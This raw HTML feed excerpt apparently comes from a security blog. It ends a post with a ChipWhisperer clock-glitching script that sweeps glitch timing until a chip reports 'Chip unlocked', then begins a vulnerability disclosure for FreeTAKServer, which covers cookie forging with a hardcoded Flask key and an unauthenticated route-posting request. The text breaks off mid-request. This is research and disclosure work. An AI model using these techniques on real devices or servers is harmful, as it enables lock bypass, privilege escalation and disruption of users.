    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hs2&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;glitch&quot;&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;# Pin 9 on DUT
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clk_src&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;clkgen&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trigger_src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;manual&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;clock_xor&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clkgen_freq&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;16E6&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 16MHz Clock Signal
&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;# Serial Rx Setup to communicate with target
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;baud&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19200&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GlitchController&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;reset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;normal&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; 
            &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ext_offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Parameters to set the timing of the glitch
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;       
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ext_offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_global_step&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Reset function for the DUT
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;reboot_flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;low&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nrst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;high_z&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.05&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;cw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch_logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setLevel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logging&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Reset target chip and Start the Glitch cycle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;reboot_flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch_setting&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch_values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch_setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch_setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glitch_setting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;manualTrigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Chip unlocked'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] offset: {}  |  [+] width: {}  |  [+] ext_offset: {}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
                        &lt;span class=&quot;n&quot;&gt;scope&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glitch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ext_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Full script is avalible at: &lt;a href=&quot;https://github.com/Securitybits-io/blog.securitybits.io/blob/master/misc/2023/01/clock-glitching-with-a-chipwhisperer/glitch.py&quot;&gt;Github Link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If everything is set up properly, running the code will eventually result in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2023/01/clock-glitching-with-a-chipwhisperer/glitch_result.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sysexit&quot;&gt;sys.exit()&lt;/h2&gt;

&lt;p&gt;I hope that you enjoyed reading some of this or that it at least was a bit useful, i can recommend that if you’d like to dive deeper into glitching to purchase a chipwhisperer at your &lt;a href=&quot;https://eu.mouser.com/manufacturer/newae-technology/featured-products/&quot;&gt;Newae Mouser Store&lt;/a&gt; as the free course dives really deep into the glitch.&lt;/p&gt;

&lt;p&gt;And here are some cool links:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Replicant Trezor Wallet: &lt;a href=&quot;https://voidstarsec.com/blog/replicant-part-1&quot;&gt;https://voidstarsec.com/blog/replicant-part-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Chipwhisperer Docs: &lt;a href=&quot;https://chipwhisperer.readthedocs.io/en/latest/&quot;&gt;https://chipwhisperer.readthedocs.io/en/latest/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Intro to Clock glitching: &lt;a href=&quot;https://github.com/newaetech/chipwhisperer-jupyter/blob/b5b8192b5ef98909b8466234700fd306394cdeef/courses/fault101/Fault%201_1%20-%20Introduction%20to%20Clock%20Glitching.ipynb&quot;&gt;Long Link to Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(Stay tuned, might actually do this on the cheap with a Raspberry Pico as well…)&lt;/p&gt;</content><author><name>Christoffer Claesson</name></author><category term="hardware" /><category term="security" /><summary type="html">What happens when things get out of sync?… SCIENCE!</summary></entry><entry><title type="html">Securityaudit of an OpenSource Software: FreeTAKServer</title><link href="/securityaudit-of-an-open-source-project-takserver" rel="alternate" type="text/html" title="Securityaudit of an OpenSource Software: FreeTAKServer" /><published>2022-02-14T00:00:00+00:00</published><updated>2022-02-14T00:00:00+00:00</updated><id>/securityaudit-of-an-open-source-project-takserver</id><content type="html" xml:base="/securityaudit-of-an-open-source-project-takserver">&lt;blockquote&gt;
  &lt;p&gt;The parrot is not dead, its RESTing&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A colleague and I decided to have a look at a open-source project called &lt;a href=&quot;https://github.com/FreeTAKTeam/FreeTakServer&quot;&gt;FreeTAKServer&lt;/a&gt; and its frontend &lt;a href=&quot;https://github.com/FreeTAKTeam/UI&quot;&gt;FreeTAKServer-UI&lt;/a&gt;. Mostly for fun, but there’s always bugs to be had!&lt;/p&gt;

&lt;h2 id=&quot;what-is-freetakserver&quot;&gt;What is FreeTAKServer&lt;/h2&gt;

&lt;p&gt;According to the Github pages:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;FTS is a Python3 Flask implementation of the TAK Server for devices like ATAK, WinTAK, and ITAK, it is cross-platform and runs from a multi node installation on AWS down to the Android edition. It’s free and open source (released under the Eclipse Public License.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h2&gt;

&lt;p&gt;The vulnerabilities that will be discussed below affects currently the:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;FreeTAKServer-1.9.8 Public&lt;/li&gt;
  &lt;li&gt;FreeTAKServer-UI-1.9.5&lt;/li&gt;
  &lt;li&gt;Hosted on Fully patched Ubuntu 20.04.3 LTS&lt;/li&gt;
  &lt;li&gt;Python 3.8.10&lt;/li&gt;
  &lt;li&gt;Flask 1.1.2&lt;/li&gt;
  &lt;li&gt;Werkzeug 2.0.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A list of the following vulnerabilities was discovered:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;[CVE-2022-25510] Hardcoded Flask Secrets Key&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25512] API and Websocket key leakage&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25508] Unauthenticated RestAPI Endpoints&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25507] XSS through Emergency Broadcast System from WebUI&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25507] XSS through Emergency Broadcast System from End User Device&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25506] SQL Injection leaking User Database&lt;/li&gt;
  &lt;li&gt;[CVE-2022-25511] Arbitrary File Write Leading to Remote Code Execution
    &lt;ol&gt;
      &lt;li&gt;Through WebUI (Authenticated)&lt;/li&gt;
      &lt;li&gt;Through End User Device (Unauthenticated)&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Lets begin!&lt;/p&gt;

&lt;h3 id=&quot;cve-2022-25510-hardcoded-flask-secrets-key&quot;&gt;[CVE-2022-25510] Hardcoded Flask Secrets Key&lt;/h3&gt;

&lt;p&gt;Let’s start of with something easy. Flask signs all their client sessions with a secret key, usually defined in an &lt;em&gt;Environment Variable&lt;/em&gt;. In this case though there’s three places that these are hardcoded into. 
&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/Github_Flask_Secret-key.jpg&quot; alt=&quot;Flask secret keys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gives a malicious user the ability to sign their own cookies (using for example: &lt;a href=&quot;https://github.com/Paradoxis/Flask-Unsign&quot;&gt;Flask-Unsign&lt;/a&gt;), and internally change the UID of the current user and assume any other user, for example UID 1 which is the Admin. (Privilege Escalation)&lt;/p&gt;

&lt;p&gt;Another interesting issue that you run into as well is that having two Flask servers with the same &lt;em&gt;secret key&lt;/em&gt; makes it possible for a user to reuse a UID 1 cookie from Server A, and apply that cookie to Server B logging in to the same UID 1. (Lateral movement/Authentication bypass)&lt;/p&gt;

&lt;h3 id=&quot;cve-2022-25512-api-and-websocket-keys-galore&quot;&gt;[CVE-2022-25512] API and Websocket Keys galore&lt;/h3&gt;

&lt;p&gt;With FreeTAKServer comes also a REST API, and Websockets to programatically manage the server and fetch/post data. These API keys and Tokens should be guarded in the same way as username and password for any application. The issue arise when the API keys are fetching data into the webapplication and are reflected in the javascript of the response on each request in the web application. Both are easily extraced using built-in DevTools or through an XSS attack.&lt;/p&gt;

&lt;h5 id=&quot;api-bearer-token&quot;&gt;API Bearer Token&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/SourceCode_RestAPI-key.jpg&quot; alt=&quot;RestAPI Key&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;websocket-token&quot;&gt;Websocket Token&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/SourceCode_WebSocket-key.jpg&quot; alt=&quot;WebSocket Token&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Remember to always check the source code!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;cve-2022-25508-unauthenticated-public-restapi-endpoint&quot;&gt;[CVE-2022-25508] Unauthenticated Public RestAPI Endpoint&lt;/h3&gt;

&lt;p&gt;In the RestAPI there is also the Endpoint &lt;em&gt;/ManageRoute/postRoute&lt;/em&gt; which is unauthenticated. While this might not seem interesting at first, it is possible to broadcast new routes (suggested tracks to take) to every End User Device (EUD) connected to the server. This can create two issues, either create a Denial of Service situation where a malicious user can fill the entire map with routes, making it impossible to use the map in the EUD. The second scenario might be to create a route on which possible users might take and therefor control some of the paths and direct users into bad situations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2022/02/securityaudit-of-an-open-source-project-takserver/Unauthenticated-Endpoint.jpg&quot; alt=&quot;Unauthenticated PostRoute Endpoint&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Example Request&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/ManageRoute/postRoute&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;Host:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;FreeTAKServer:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19023&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;longitude&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;-77.02385&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;latitude&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;38.999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;routeName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;trip to Phil&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;startName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Washington&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;endName&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Philadelphia&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;timeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
